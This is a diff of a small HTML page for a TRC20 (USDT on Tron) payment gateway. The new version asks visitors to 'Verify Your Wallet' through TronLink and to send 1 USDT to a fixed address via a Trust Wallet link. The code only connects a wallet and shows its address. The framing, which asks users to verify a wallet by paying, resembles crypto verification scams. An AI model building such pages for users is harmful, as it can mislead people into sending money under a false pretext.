@@ -1,65 +1,91 @@
 <!DOCTYPE html><html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>TRC20 Payment Gateway</title>
+  <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-tronlink"></script>
   <style>
     body {
+      background: linear-gradient(135deg, #0e0e0e, #1f1f1f);
+      color: white;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #000000, #1a1a1a);
-      color: #ffffff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
+      text-align: center;
+      padding: 50px 20px;
+    }
+    .container {
+      max-width: 600px;
+      margin: auto;
+      background: #1c1c1c;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
     }
     .logo {
-      width: 120px;
+      width: 80px;
       margin-bottom: 20px;
     }
-    .card {
-      background-color: #1e1e1e;
-      padding: 30px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(0, 255, 157, 0.2);
-      text-align: center;
-    }
     h1 {
-      font-size: 24px;
+      color: #00ffcc;
       margin-bottom: 10px;
     }
-    .pay-btn {
-      background-color: #00ff9d;
+    p {
+      color: #ccc;
+      margin-bottom: 20px;
+    }
+    .btn {
+      background: #00ffcc;
       color: #000;
-      padding: 12px 24px;
       border: none;
-      border-radius: 8px;
+      padding: 12px 24px;
       font-size: 16px;
+      border-radius: 8px;
       cursor: pointer;
+      transition: 0.3s;
+    }
+    .btn:hover {
+      background: #00ddaa;
+    }
+    .walletAddress {
       margin-top: 20px;
-      transition: background-color 0.3s ease;
-      text-decoration: none;
-      display: inline-block;
+      font-size: 14px;
+      word-break: break-word;
+      color: #888;
     }
-    .pay-btn:hover {
-      background-color: #00cc80;
-    }
-    .note {
-      margin-top: 15px;
-      font-size: 12px;
-      color: #aaaaaa;
+    .divider {
+      margin: 40px auto;
+      width: 80%;
+      height: 1px;
+      background: #444;
     }
   </style>
 </head>
 <body>
-  <img src="logo.png" alt="TRC20 Logo" class="logo" />
-  <div class="card">
-    <h1>TRC20 Payment Gateway</h1>
-    <p>Pay securely using Trust Wallet</p>
-    <a class="pay-btn" href="https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=TJs3rspiCknNcK8gndtxHqzGNZCvdWQLrs" target="_blank">Pay via Trust Wallet</a>
-    <div class="note">Ensure you are on the Trust Wallet DApp browser</div>
-  </div>
-</body>
+  <div class="container">
+    <img src="https://raw.githubusercontent.com/snitchxz/Trc20/main/logo.png" alt="TRC20 Logo" class="logo" /><h1>Verify Your Wallet</h1>
+<p>Connect your TronLink or use Trust Wallet for secure payment</p>
+<button class="btn" onclick="connectWallet()">✅ Verify Wallet (TronLink)</button>
+
+<div class="walletAddress" id="walletAddress"></div>
+
+<div class="divider"></div>
+
+<h2>Trust Wallet Users</h2>
+<p>Click below to send 1 USDT via Trust Wallet:</p>
+<a href="https://link.trustwallet.com/send?asset=c195_tTR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t&address=TJs3rspiCknNcK8gndtxHqzGNZCvdWQLrs" class="btn">Pay via Trust Wallet</a>
+
+  </div>  <script>
+    async function connectWallet() {
+      if (window.tronLink) {
+        try {
+          const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+          const address = window.tronWeb.defaultAddress.base58;
+          document.getElementById("walletAddress").innerText = "Connected Wallet: " + address;
+        } catch (err) {
+          alert("Connection denied by user.");
+        }
+      } else {
+        alert("Please install TronLink Wallet Extension or open in TronLink DApp browser.");
+      }
+    }
+  </script></body>
 </html>
